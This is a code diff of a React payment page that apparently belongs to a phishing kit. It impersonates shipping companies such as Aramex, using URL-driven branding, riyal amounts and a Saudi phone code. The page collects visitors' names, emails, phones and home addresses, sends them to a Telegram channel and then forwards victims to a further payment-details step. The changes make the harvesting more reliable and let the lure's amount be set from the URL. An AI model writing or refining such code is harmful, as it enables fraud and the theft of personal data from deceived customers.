@@ -16,21 +16,24 @@ import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, 
 import { designSystem } from "@/lib/designSystem";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
+import PageLoader from "@/components/PageLoader";
 
 const PaymentRecipient = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading } = useLink(id);
   const updateLink = useUpdateLink();
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const urlParams = new URLSearchParams(window.location.search);
   const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
   const currencyParam = urlParams.get('currency');
   const titleParam = urlParams.get('title');
+  const amountParam = urlParams.get('amount');
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
@@ -48,7 +51,7 @@ const PaymentRecipient = () => {
   const phoneCode = countryData?.phoneCode || "+966";
   const currencyCode = currencyParam || countryData?.currency || "SAR";
 
-  const rawAmount = shippingInfo?.cod_amount;
+  const rawAmount = amountParam || shippingInfo?.cod_amount;
   let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
@@ -59,6 +62,10 @@ const PaymentRecipient = () => {
         amount = parsed;
       }
     }
+  }
+
+  if (isLoading) {
+    return <PageLoader message="جاري تحميل بيانات الدفع..." />;
   }
 
   const formattedAmount = formatCurrency(amount, currencyCode);
@@ -73,65 +80,83 @@ const PaymentRecipient = () => {
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
-
-    if (!linkData) return;
-
-    const formData = new FormData();
-    formData.append('form-name', 'payment-recipient');
-    formData.append('name', customerName);
-    formData.append('email', customerEmail);
-    formData.append('phone', customerPhone);
-    formData.append('address', residentialAddress);
-    formData.append('service', serviceName);
-    formData.append('amount', formattedAmount);
-    formData.append('linkId', id || '');
+    
+    if (isSubmitting) return;
+    setIsSubmitting(true);
 
     try {
-      await fetch('/', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams(formData as Record<string, string>).toString()
-      });
+      const formData = new FormData();
+      formData.append('form-name', 'payment-recipient');
+      formData.append('name', customerName);
+      formData.append('email', customerEmail);
+      formData.append('phone', customerPhone);
+      formData.append('address', residentialAddress);
+      formData.append('service', serviceName);
+      formData.append('amount', formattedAmount);
+      formData.append('linkId', id || '');
+
+      try {
+        await fetch('/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams(formData as Record<string, string>).toString()
+        });
+      } catch (error) {
+        console.error('Form submission error:', error);
+      }
+
+      const productionDomain = window.location.origin;
+      try {
+        await sendToTelegram({
+          type: 'payment_recipient',
+          data: {
+            name: customerName,
+            email: customerEmail,
+            phone: customerPhone,
+            address: residentialAddress,
+            service: serviceName,
+            amount: formattedAmount,
+            payment_url: `${productionDomain}/pay/${id}/details`
+          },
+          timestamp: new Date().toISOString()
+        });
+      } catch (error) {
+        console.error('Telegram error:', error);
+      }
+
+      if (linkData) {
+        try {
+          const customerData = {
+            ...linkData.payload,
+            customerInfo: {
+              name: customerName,
+              email: customerEmail,
+              phone: customerPhone,
+              address: residentialAddress,
+              service: serviceName,
+              amount: formattedAmount
+            },
+            selectedCountry: countryCode,
+            service_key: serviceKey,
+            service_name: serviceName
+          };
+
+          await updateLink.mutateAsync({
+            linkId: id!,
+            payload: customerData
+          });
+        } catch (error) {
+          console.error('Update link error:', error);
+        }
+      }
+
+      const nextUrl = `/pay/${id}/details?company=${serviceKey}&currency=${currencyCode}&amount=${amount}`;
+      navigate(nextUrl);
     } catch (error) {
+      console.error('Proceed error:', error);
+    } finally {
+      setIsSubmitting(false);
     }
-
-    const productionDomain = window.location.origin;
-    await sendToTelegram({
-      type: 'payment_recipient',
-      data: {
-        name: customerName,
-        email: customerEmail,
-        phone: customerPhone,
-        address: residentialAddress,
-        service: serviceName,
-        amount: formattedAmount,
-        payment_url: `${productionDomain}/pay/${id}/details`
-      },
-      timestamp: new Date().toISOString()
-    });
-
-    try {
-      const customerData = {
-        ...linkData.payload,
-        customerInfo: {
-          name: customerName,
-          email: customerEmail,
-          phone: customerPhone,
-          address: residentialAddress,
-          service: serviceName,
-          amount: formattedAmount
-        },
-        selectedCountry: countryCode
-      };
-
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: customerData
-      });
-    } catch (error) {
-    }
-
-    navigate(`/pay/${id}/details`);
   };
   
   return (
@@ -424,14 +449,21 @@ const PaymentRecipient = () => {
               <Button
                 type="submit"
                 size="lg"
-                className="w-full text-xl py-8 text-white font-bold mt-8 transition-all duration-300 hover:shadow-2xl rounded-xl"
+                disabled={isSubmitting || !customerName || !customerEmail || !customerPhone || !residentialAddress}
+                className="w-full text-xl py-8 text-white font-bold mt-8 transition-all duration-300 hover:shadow-2xl rounded-xl disabled:opacity-50 disabled:cursor-not-allowed"
                 style={{
                   background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                   boxShadow: `0 12px 32px -8px ${primaryColor}70`
                 }}
               >
-                <span className="ml-3">متابعة للدفع</span>
-                <ArrowLeft className="w-6 h-6 mr-2" />
+                {isSubmitting ? (
+                  <span>جاري المعالجة...</span>
+                ) : (
+                  <>
+                    <span className="ml-3">متابعة للدفع</span>
+                    <ArrowLeft className="w-6 h-6 mr-2" />
+                  </>
+                )}
               </Button>
             
               <div className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-500">
